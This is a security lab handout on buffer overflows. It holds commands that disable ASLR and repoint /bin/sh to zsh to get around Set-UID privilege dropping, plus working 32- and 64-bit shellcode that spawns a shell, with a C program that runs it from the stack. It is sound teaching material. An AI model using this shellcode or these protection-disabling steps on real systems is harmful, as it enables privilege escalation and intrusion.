# Lab 2 - Buffer Overflows

Buffer overflow is defined as the condition in which
a program attempts to write data beyond the boundary of a buffer.
This vulnerability can be used by a malicious user
to alter the flow control of the program,
leading to the execution of malicious code.
The objective of this lab is for you to
gain practical insights into this type of vulnerability, and
learn how to exploit the vulnerability in attacks.

More specifically,
in this lab, you will be given a program with a buffer-overflow vulnerability;
your task is to
develop a scheme to exploit the vulnerability and
finally gain the root privilege.

This lab covers the following topics:
- Buffer overflow vulnerability and exploit
- Shellcode (32-bit and 64-bit)
- Stack layout

## Step 0: prepare for a secure practice environment

Modern operating systems have implemented several security mechanisms
to make the buffer-overflow attack difficult.
We disable them to simplify our attacks.

- Ubuntu and several other Linux-based systems
  uses address space randomization (ASLR)
  to randomize the starting address of heap and stack.
  This makes guessing the exact addresses difficult.
  As you will experience later,
  guessing addresses is one of the critical steps of buffer-overflow attacks.
  This feature can be disabled using the following command
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

- In the recent versions of Ubuntu,
  the `/bin/sh` symbolic link points to the `/bin/dash` shell.
  The `dash` program, as well as `bash`,
  has implemented a security countermeasure that
  prevents itself from being executed in a `Set-UID` process.
  Basically, if they detect that they are executed
  in a `Set-UID` process,
  they will immediately change the effective user ID
  to the process’s real user ID,
  essentially dropping the privilege.
  Since our victim program is a `Set-UID` program,
  and our attack relies on running `/bin/sh`, the
  countermeasure in `/bin/dash` makes our attack more difficult.
  Hence, we override the default shell to `zsh`
  that does not have such a countermeasure.
```bash
sudo ln -sf /bin/zsh /bin/sh
```

## Step 1: getting familiar with shellcode

The ultimate goal of buffer-overflow attacks is
to inject malicious code into the target program,
so the code can be executed using the target program’s privilege.
Shellcode is widely used in most code-injection attacks.
Let us get familiar with it in this step.

### The C version of shellcode

A shellcode is basically a piece of code that launches a shell.
If we use C code to implement it, it will look like the following:

```c
#include <stdio.h>
int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

Unfortunately,
we cannot just compile this code and use the binary code as our shellcode
(modern compiler does way more things than C to binary translation).

The best way to write a shellcode is to use assembly code.
In this lab,
we only provide the binary version of a shellcode,
without explaining how it is written or how works (it is non-trivial).
If you are interested in
how shellcode works and/or
how write a shellcode from scratch,
you can learn that from a diverse range of tutorials online,
such as the [shellcode lab](https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/)
in the [SEED Labs](https://seedsecuritylabs.org/labs.html) project.

### Invoking the shellcode

In this task,
we will test the shellcode that invokes `/bin/sh` (i.e., spawns a shell)
by putting it into a C program.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv) {
    char code[500];
    strcpy(code, shellcode);        // Copy the shellcode to the stack
    int (*func)() = (int(*)())code;
    func();                         // Invoke the shellcode from the stack
    return 1;
}
```

Now, save the C code into a file named `call_shellcode.c`
and compile it with:

```bash
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
```
You will notice that two binaries are produced
`a32.out` and `a64.out`.

The `call_shellcode.c` file includes two copies of shellcode,
one is 32-bit and the other is 64-bit.
When we compile the program using the `-m32` flag,
the 32-bit version will be used;
without this flag, the 64-bit version will be used.
It should also be noted that
the compilation uses the `-z execstack` option,
which allows code to be executed from the stack;
without this option, the program will fail.

Now run the `./a32.out` and `./a64.out` binaries and
describe what you observe.